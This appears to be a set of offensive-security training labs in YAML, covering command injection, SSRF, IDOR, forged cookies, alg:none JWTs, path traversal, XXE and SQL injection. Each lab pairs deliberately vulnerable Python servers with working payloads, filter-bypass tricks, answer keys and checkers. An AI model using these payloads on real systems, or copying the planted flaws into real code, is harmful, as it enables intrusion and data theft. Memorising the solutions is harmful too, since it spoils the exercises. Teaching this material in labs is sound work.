- id: offsec-web-005
  title: Making the server act for you
  difficulty: 4
  kind: build
  tags: [web, command-injection, rce, ssrf]
  tutorial: |
    **What you're learning.** Command injection and SSRF: making the server run commands or fetch URLs for you.

    ### The idea

    **Command injection**: input concatenated into a shell command. Shell metacharacters chain your own command:

    ```
    host=127.0.0.1; cat /flag.txt      # ; runs a second command
    host=127.0.0.1 && id               # && / | / $(...) / `...` also work
    ```
    **SSRF** (server-side request forgery): the server fetches a URL you supply, so you can reach things **only it can see**: internal services (`127.0.0.1:9000`), cloud metadata (`169.254.169.254`), other hosts behind its firewall.

    ### Commands you'll use

    ```bash
    curl -sG http://127.0.0.1:8080/ping --data-urlencode 'host=127.0.0.1; cat /flag.txt' | grep -oE 'KL\{[^}]+\}'
    curl -sG http://127.0.0.1:8080/ping --data-urlencode 'host=127.0.0.1 | id'          # another separator
    curl -sG http://127.0.0.1:8081/fetch --data-urlencode 'url=http://127.0.0.1:9000/' | grep -oE 'KL\{[^}]+\}'
    curl -sG http://127.0.0.1:8081/fetch --data-urlencode 'url=http://169.254.169.254/latest/meta-data/'   # cloud metadata, if present
    ```
    URL-encode the payload so `;`, spaces and `&` reach the server intact.

    ### Common mistakes

    - An unencoded `;` or `&` being eaten by **your** shell or the query parser.
    - A filter that blocks spaces: try `${IFS}`, `;cat</flag.txt`, or newlines.
    - SSRF blocked by a hostname allowlist: try `http://127.0.0.1`, `http://[::1]`, or a redirect you control.

    ### Check your work

    `cmdi.txt` holds the flag from `/flag.txt`, and `ssrf.txt` the flag from the internal `127.0.0.1:9000` service.
  scenario: |
    Two Acme endpoints take an action on your behalf. Abuse both.

    ## Part 1: The diagnostics endpoint runs your commands — `http://127.0.0.1:8080/ping?host=127.0.0.1`
    Shells out to `ping` by concatenating `host`. A readable `/flag.txt` sits in
    the container. Inject a command to read it and write the `KL{...}` flag to
    **`/lab/cmdi.txt`**.

    ## Part 2: Make the server fetch it for you — `http://127.0.0.1:8081/fetch?url=...`
    Fetches whatever URL you give it. An internal admin service listens *inside*
    the app on **127.0.0.1:9000** and holds a flag. Reach it through `fetch` and
    write the `KL{...}` flag to **`/lab/ssrf.txt`**.
  hints:
    - "Part 1: `;` chains a command: `curl -s -G 'http://127.0.0.1:8080/ping' --data-urlencode 'host=127.0.0.1; cat /flag.txt'`."
    - "Part 2: point the fetcher at the internal port: `curl -s -G http://127.0.0.1:8081/fetch --data-urlencode 'url=http://127.0.0.1:9000/'`."
  solution: |
    ```bash
    # Part 1 — command injection
    curl -s -G 'http://127.0.0.1:8080/ping' \
      --data-urlencode 'host=127.0.0.1; cat /flag.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/cmdi.txt

    # Part 2 — SSRF to the internal service
    curl -s -G http://127.0.0.1:8081/fetch \
      --data-urlencode 'url=http://127.0.0.1:9000/' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/ssrf.txt
    ```
  setup: |
    # --- part 1: The diagnostics endpoint runs your commands ---
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/p1"
    web_target act1 8080 <<'PY'
    import os, subprocess, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    FLAG = os.environ.get("FLAG", "KL{missing}")
    open("/flag.txt", "w").write(FLAG + "\n")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body):
            b = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        def do_GET(self):
            u = urllib.parse.urlparse(self.path)
            if u.path != "/ping":
                self._send(200, "Usage: /ping?host=127.0.0.1"); return
            host = urllib.parse.parse_qs(u.query).get("host", ["127.0.0.1"])[0]
            cmd = "ping -c1 -W1 " + host
            out = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            self._send(200, out.stdout + out.stderr)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
    # --- part 2: Make the server fetch it for you ---
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/p2"
    web_target act2 8081 <<'PY'
    import os, threading, urllib.parse, urllib.request, http.server, socketserver
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    class Internal(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def do_GET(self):
            b=("<h1>internal admin</h1><p>flag: %s</p>"%FLAG).encode()
            self.send_response(200); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    threading.Thread(target=lambda: socketserver.TCPServer(("127.0.0.1",9000),Internal).serve_forever(),daemon=True).start()
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body):
            b=body.encode() if isinstance(body,str) else body
            self.send_response(c); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            u=urllib.parse.urlparse(self.path)
            if u.path!="/fetch": self._s(200,"Try /fetch?url=http://example.com"); return
            url=urllib.parse.parse_qs(u.query).get("url",[""])[0]
            try:
                with urllib.request.urlopen(url,timeout=3) as r: self._s(200,r.read())
            except Exception as e: self._s(200,"fetch error: %s"%e)
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
  check: |
    info "Part 1: The diagnostics endpoint runs your commands"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/cmdi.txt 2>/dev/null | head -1)
    check_eq "flag read via command injection" "$got" "$(cat "$KL_STATE/p1")"
    info "Part 2: Make the server fetch it for you"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/ssrf.txt 2>/dev/null | head -1)
    check_eq "internal service reached via SSRF" "$got" "$(cat "$KL_STATE/p2")"
  solve: |
    # --- part 1: The diagnostics endpoint runs your commands ---
    curl -s -G 'http://127.0.0.1:8080/ping' \
      --data-urlencode 'host=127.0.0.1; cat /flag.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/cmdi.txt
    # --- part 2: Make the server fetch it for you ---
    curl -s -G http://127.0.0.1:8081/fetch \
      --data-urlencode 'url=http://127.0.0.1:9000/' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/ssrf.txt

- id: offsec-web-010
  title: Broken access control — trusting the client
  difficulty: 4
  kind: build
  tags: [web, idor, access-control, cookies, jwt, auth-bypass]
  tutorial: |
    **What you're learning.** Broken access control: IDOR, forgeable cookies, and `alg:none` JWTs.

    ### The idea

    These flaws trust **client-controlled** data to decide access:

    | flaw | fix it isn't, attack it is |
    |---|---|
    | **IDOR** | `/account?id=1` with no ownership check: change `id` to 2 and read someone else's data |
    | **forgeable cookie** | `auth=base64("user")`: re-encode it as `admin` |
    | **`alg:none` JWT** | a JWT whose header says `"alg":"none"` is **unsigned**: forge any payload |

    A JWT is `base64url(header).base64url(payload).signature`. With `alg:none`, the signature is empty, so you can set `{"role":"admin"}` yourself.

    ### Commands you'll use

    ```bash
    curl -s 'http://127.0.0.1:8080/account?id=2' | grep -oE 'KL\{[^}]+\}'           # IDOR
    curl -s --cookie "auth=$(printf admin | base64)" http://127.0.0.1:8081/ | grep -oE 'KL\{[^}]+\}'
    b64() { printf '%s' "$1" | base64 | tr '+/' '-_' | tr -d '='; }                 # base64url, no padding
    tok="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"role":"admin"}')."            # trailing dot = empty signature
    curl -s --cookie "token=$tok" http://127.0.0.1:8082/ | grep -oE 'KL\{[^}]+\}'
    ```
    Inspect a real JWT first: `cut -d. -f2 <<<"$jwt" | base64 -d` (pad if needed).

    ### Common mistakes

    - Standard base64 instead of **base64url** (`+/` → `-_`, no `=`) for the JWT.
    - Forgetting the trailing `.` on an `alg:none` token (the empty signature segment).
    - Changing the cookie but leaving a second session cookie that still says "user".

    ### Check your work

    `idor.txt`, `cookie.txt` and `jwt.txt` hold the three flags.
  scenario: |
    Three Acme features decide access from client-supplied data. Defeat each.

    ## Part 1: Someone else's account — `http://127.0.0.1:8080/account?id=1`
    Trusts `id` with no ownership check. Account `id=2` is the admin and holds a
    flag. Read it and write it to **`/lab/idor.txt`**.

    ## Part 2: Bake your own cookie — `http://127.0.0.1:8081/`
    Reads a base64 `auth` cookie as your role. Re-bake it as `admin` to get the
    flag; write it to **`/lab/cookie.txt`**.

    ## Part 3: A token that signs itself — `http://127.0.0.1:8082/`
    Issues a JWT in the `token` cookie and accepts `alg:none` (unsigned) tokens.
    Forge `{"role":"admin"}`, send it, and write the flag to **`/lab/jwt.txt`**.
  hints:
    - "Part 1: just change the number: `curl -s 'http://127.0.0.1:8080/account?id=2'`."
    - "Part 2: the cookie is `base64(role)`: `curl -s --cookie \"auth=$(printf admin | base64)\" http://127.0.0.1:8081/`."
    - "Part 3: header `{\"alg\":\"none\",\"typ\":\"JWT\"}`, payload `{\"role\":\"admin\"}`, base64url, joined by dots with a trailing dot and empty signature."
  solution: |
    ```bash
    # Part 1 — IDOR
    curl -s 'http://127.0.0.1:8080/account?id=2' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/idor.txt

    # Part 2 — forged cookie
    curl -s --cookie "auth=$(printf admin | base64)" http://127.0.0.1:8081/ \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/cookie.txt

    # Part 3 — alg:none JWT
    b64(){ printf %s "$1" | base64 | tr '+/' '-_' | tr -d '='; }
    TOK="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"role":"admin"}')."
    curl -s --cookie "token=$TOK" http://127.0.0.1:8082/ \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/jwt.txt
    ```
  setup: |
    # --- part 1: Someone else's account ---
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/p1"
    web_target bac1 8080 <<'PY'
    import os, urllib.parse, http.server, socketserver
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    ACCTS={"1":"you (user). balance: $12.00","2":"administrator. note: %s"%FLAG}
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body):
            b=body.encode(); self.send_response(c); self.send_header("Content-Type","text/html")
            self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            u=urllib.parse.urlparse(self.path)
            if u.path!="/account": self._s(200,"<a href=/account?id=1>your account</a>"); return
            i=urllib.parse.parse_qs(u.query).get("id",["1"])[0]
            self._s(200,"<h1>Account %s</h1><p>%s</p>"%(i,ACCTS.get(i,"not found")))
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
    # --- part 2: Bake your own cookie ---
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/p2"
    web_target bac2 8081 <<'PY'
    import os, base64, http.server, socketserver
    from http.cookies import SimpleCookie
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body,extra=None):
            b=body.encode(); self.send_response(c); self.send_header("Content-Type","text/html")
            if extra:
                for k,v in extra.items(): self.send_header(k,v)
            self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            ck=SimpleCookie(self.headers.get("Cookie",""))
            role="guest"
            if "auth" in ck:
                try: role=base64.b64decode(ck["auth"].value).decode("utf-8","replace")
                except Exception: role="guest"
            if role=="admin":
                self._s(200,"<h1>Admin panel</h1><p>flag: %s</p>"%FLAG)
            else:
                self._s(200,"<p>role=%s. admins only.</p>"%role,
                        {"Set-Cookie":"auth=%s"%base64.b64encode(b"user").decode()})
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
    # --- part 3: A token that signs itself ---
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/p3"
    web_target bac3 8082 <<'PY'
    import os, json, base64, http.server, socketserver
    from http.cookies import SimpleCookie
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    def b64d(s):
        s+="="*(-len(s)%4); return base64.urlsafe_b64decode(s)
    def verify(tok):
        try:
            h,p,sig=tok.split(".")
            head=json.loads(b64d(h)); pay=json.loads(b64d(p))
            if head.get("alg")=="none": return pay
            return None
        except Exception: return None
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body):
            b=body.encode(); self.send_response(c); self.send_header("Content-Type","text/html")
            self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            ck=SimpleCookie(self.headers.get("Cookie","")); pay=None
            if "token" in ck: pay=verify(ck["token"].value)
            if pay and pay.get("role")=="admin": self._s(200,"<h1>admin</h1><p>flag: %s</p>"%FLAG)
            else: self._s(200,"<p>guest area</p>")
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
  check: |
    info "Part 1: Someone else's account"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/idor.txt 2>/dev/null | head -1)
    check_eq "admin account read via IDOR" "$got" "$(cat "$KL_STATE/p1")"
    info "Part 2: Bake your own cookie"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/cookie.txt 2>/dev/null | head -1)
    check_eq "flag via forged admin cookie" "$got" "$(cat "$KL_STATE/p2")"
    info "Part 3: A token that signs itself"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/jwt.txt 2>/dev/null | head -1)
    check_eq "flag via forged alg:none JWT" "$got" "$(cat "$KL_STATE/p3")"
  solve: |
    # --- part 1: Someone else's account ---
    curl -s 'http://127.0.0.1:8080/account?id=2' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/idor.txt
    # --- part 2: Bake your own cookie ---
    curl -s --cookie "auth=$(printf admin | base64)" http://127.0.0.1:8081/ \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/cookie.txt
    # --- part 3: A token that signs itself ---
    b64(){ printf %s "$1" | base64 | tr '+/' '-_' | tr -d '='; }
    TOK="$(b64 '{"alg":"none","typ":"JWT"}').$(b64 '{"role":"admin"}')."
    curl -s --cookie "token=$TOK" http://127.0.0.1:8082/ \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/jwt.txt

- id: offsec-web-004
  title: Reading files off the server
  difficulty: 5
  kind: build
  tags: [web, path-traversal, lfi, xxe, xml]
  tutorial: |
    **What you're learning.** File disclosure: path traversal and XXE.

    ### The idea

    **Path traversal**: a file parameter with no sanitisation lets `../` climb out of the intended directory:

    ```
    file=welcome.txt            → pages/welcome.txt
    file=../../etc/passwd       → /etc/passwd
    ```
    **XXE** (XML external entity): an XML parser that resolves external entities can be told to read a local file:

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]>
    <name>&x;</name>
    ```
    The parser substitutes `&x;` with the file's contents, which comes back in the response.

    ### Commands you'll use

    ```bash
    curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt' | grep -oE 'KL\{[^}]+\}'
    curl -s 'http://127.0.0.1:8080/view?file=....//....//etc/passwd' | head        # if ../ is stripped once
    curl -s -X POST --data-binary \
      '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]><name>&x;</name>' \
      http://127.0.0.1:8081/import | grep -oE 'KL\{[^}]+\}'
    ```
    How many `../` you need depends on how deep the base directory is: add levels until you reach `/`.

    ### Common mistakes

    - Too few `../`: you stay inside the directory. Too many is harmless (`/` is the top).
    - A filter that strips one `../`: `....//` or encoding (`%2e%2e%2f`, double-encoded) can slip past (sec-085 is the defender's side).
    - XXE with `--data` instead of `--data-binary`: curl mangles the XML.

    ### Check your work

    `traversal.txt` holds the flag from `secret.txt`, and `xxe.txt` the flag from `/flag.txt` via the entity.
  scenario: |
    Both Acme endpoints can be tricked into reading a file outside what they mean
    to serve.

    ## Part 1: Climb out of the web root — `http://127.0.0.1:8080/view?file=welcome.txt`
    Serves files from a `pages/` directory with no sanitisation, so `../` escapes
    it. A `secret.txt` sits in the container's `/`. Read it through the endpoint
    and write the `KL{...}` flag to **`/lab/traversal.txt`**.

    ## Part 2: The parser that reads files — `http://127.0.0.1:8081/import`
    POST raw XML; the parser resolves external entities. Read **`/flag.txt`**
    inside the server with an external entity and write the `KL{...}` flag to
    **`/lab/xxe.txt`**.
  hints:
    - "Part 1: prefix enough `../` to reach `/`, then the file: `curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt'`."
    - "Part 2: define an entity and use it in an echoed element: POST `<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///flag.txt\">]><name>&x;</name>`."
  solution: |
    ```bash
    # Part 1 — path traversal
    curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/traversal.txt

    # Part 2 — XXE
    curl -s -X POST --data-binary \
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]><name>&x;</name>' \
     http://127.0.0.1:8081/import | grep -oE 'KL\{[0-9a-f]+\}' > /lab/xxe.txt
    ```
  setup: |
    # --- part 1: Climb out of the web root ---
    SECRET=$(rand_flag); export SECRET
    echo "$SECRET" > "$KL_STATE/p1"
    web_target disc1 8080 <<'PY'
    import os, urllib.parse, http.server, socketserver
    PORT = int(os.environ.get("PORT", "8080"))
    SECRET = os.environ.get("SECRET", "KL{missing}")
    os.makedirs("/app/pages", exist_ok=True)
    open("/app/pages/welcome.txt", "w").write("Welcome to Acme docs.\n")
    open("/secret.txt", "w").write(SECRET + "\n")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a): pass
        def _send(self, code, body, ctype="text/plain"):
            b = body if isinstance(body, bytes) else body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(b)))
            self.end_headers()
            self.wfile.write(b)
        def do_GET(self):
            u = urllib.parse.urlparse(self.path)
            if u.path != "/view":
                self._send(200, "Try /view?file=welcome.txt"); return
            q = urllib.parse.parse_qs(u.query)
            name = q.get("file", ["welcome.txt"])[0]
            path = "/app/pages/" + name
            try:
                with open(path, "rb") as f:
                    self._send(200, f.read())
            except Exception as e:
                self._send(404, "error: %s" % e)
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("0.0.0.0", PORT), H) as s:
        s.serve_forever()
    PY
    unset SECRET
    # --- part 2: The parser that reads files ---
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/p2"
    web_target disc2 8081 <<'PY'
    import os, http.server, socketserver
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    open("/flag.txt","w").write(FLAG+"\n")
    def parse_name(xml_bytes):
        import xml.parsers.expat as expat
        got={"text":""}
        p=expat.ParserCreate()
        def ext_ref(ctx,base,sysid,pubid):
            sp=p.ExternalEntityParserCreate(ctx)
            path=sysid.replace("file://","")
            try: data=open(path,"rb").read()
            except Exception: data=b""
            def ch(d): got["text"]+=d
            sp.CharacterDataHandler=ch
            sp.Parse(data,True)
            return 1
        p.CharacterDataHandler=lambda d: got.__setitem__("text",got["text"]+d)
        p.ExternalEntityRefHandler=ext_ref
        p.Parse(xml_bytes,True)
        return got["text"]
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body):
            b=body.encode(); self.send_response(c); self.send_header("Content-Type","text/plain")
            self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_POST(self):
            n=int(self.headers.get("Content-Length","0")); raw=self.rfile.read(n)
            try: txt=parse_name(raw)
            except Exception as e: self._s(200,"parse error: %s"%e); return
            self._s(200,"imported: %s"%txt)
        def do_GET(self): self._s(200,"POST XML to /import")
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
  check: |
    info "Part 1: Climb out of the web root"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/traversal.txt 2>/dev/null | head -1)
    check_eq "secret read via path traversal" "$got" "$(cat "$KL_STATE/p1")"
    info "Part 2: The parser that reads files"
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/xxe.txt 2>/dev/null | head -1)
    check_eq "file read via XXE" "$got" "$(cat "$KL_STATE/p2")"
  solve: |
    # --- part 1: Climb out of the web root ---
    curl -s 'http://127.0.0.1:8080/view?file=../../secret.txt' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/traversal.txt
    # --- part 2: The parser that reads files ---
    curl -s -X POST --data-binary \
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag.txt">]><name>&x;</name>' \
     http://127.0.0.1:8081/import | grep -oE 'KL\{[0-9a-f]+\}' > /lab/xxe.txt

# ===== Capstone: a real-world lab =====

- id: offsec-web-020
  title: Incident — breach the Acme portal
  difficulty: 5
  kind: build
  tags: [web, incident, recon, sqli]
  scenario: |
    Put it together. The Acme customer portal is on **http://127.0.0.1:8080/**.
    Your goal is the administrator's API key, a **`KL{...}`** flag, stored in the
    database.

    Two steps stand in the way:

    1. The homepage links nowhere useful, but a **hidden login path** is named in a
       comment or a `robots.txt`-style hint. Find it.
    2. That login is backed by SQL built from string concatenation. Use what you
       learned to **bypass it or extract** the admin's `api_key`.

    Write the flag to **`/lab/flag.txt`**.
  hints:
    - "Start with `curl -s http://127.0.0.1:8080/` and look at the HTML comment for the login path."
    - "The login path is `/portal/login`. It runs `SELECT api_key FROM admins WHERE user='<u>' AND pass='<p>'`; inject `user=admin' -- `."
    - "`curl -s -X POST http://127.0.0.1:8080/portal/login --data-urlencode \"user=admin' -- \" --data 'pass=x'`"
  solution: |
    ```bash
    # 1) discover the login path from the homepage comment
    curl -s http://127.0.0.1:8080/ | grep -oE '/[a-z/]+login'
    # 2) SQLi auth bypass returns the admin api_key
    curl -s -X POST http://127.0.0.1:8080/portal/login \
      --data-urlencode "user=admin' -- " --data 'pass=x' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
    ```
  setup: |
    FLAG=$(rand_flag); export FLAG
    echo "$FLAG" > "$KL_STATE/answer"
    web_target portal 8080 <<'PY'
    import os, sqlite3, urllib.parse, http.server, socketserver
    PORT=int(os.environ.get("PORT","8080")); FLAG=os.environ.get("FLAG","KL{x}")
    db=sqlite3.connect(":memory:",check_same_thread=False)
    db.execute("CREATE TABLE admins(user TEXT, pass TEXT, api_key TEXT)")
    db.execute("INSERT INTO admins VALUES('admin','p-'||hex(randomblob(6)),?)",(FLAG,))
    db.commit()
    HOME=("<!doctype html><h1>Acme Portal</h1><p>Customers only.</p>"
          "<!-- staff: internal login moved to /portal/login -->")
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self,*a): pass
        def _s(self,c,body):
            b=body.encode(); self.send_response(c); self.send_header("Content-Type","text/html")
            self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
        def do_GET(self):
            if self.path=="/": self._s(200,HOME)
            elif self.path=="/portal/login": self._s(200,"<form method=post><input name=user><input name=pass></form>")
            else: self._s(404,"not found")
        def do_POST(self):
            if self.path!="/portal/login": self._s(404,"not found"); return
            n=int(self.headers.get("Content-Length","0"))
            d=urllib.parse.parse_qs(self.rfile.read(n).decode())
            u=d.get("user",[""])[0]; p=d.get("pass",[""])[0]
            sql="SELECT api_key FROM admins WHERE user='%s' AND pass='%s'"%(u,p)
            try: row=db.execute(sql).fetchone()
            except Exception as e: self._s(200,"error: %s"%e); return
            self._s(200,"api_key: %s"%row[0] if row else "denied")
    socketserver.TCPServer.allow_reuse_address=True
    with socketserver.TCPServer(("0.0.0.0",PORT),H) as s: s.serve_forever()
    PY
  check: |
    want=$(cat "$KL_STATE/answer")
    got=$(grep -oE 'KL\{[0-9a-f]+\}' /lab/flag.txt 2>/dev/null | head -1)
    check_eq "admin api_key captured" "$got" "$want"
  solve: |
    path=$(curl -s http://127.0.0.1:8080/ | grep -oE '/[a-z/]+login' | head -1)
    curl -s -X POST "http://127.0.0.1:8080$path" \
      --data-urlencode "user=admin' -- " --data 'pass=x' \
      | grep -oE 'KL\{[0-9a-f]+\}' > /lab/flag.txt
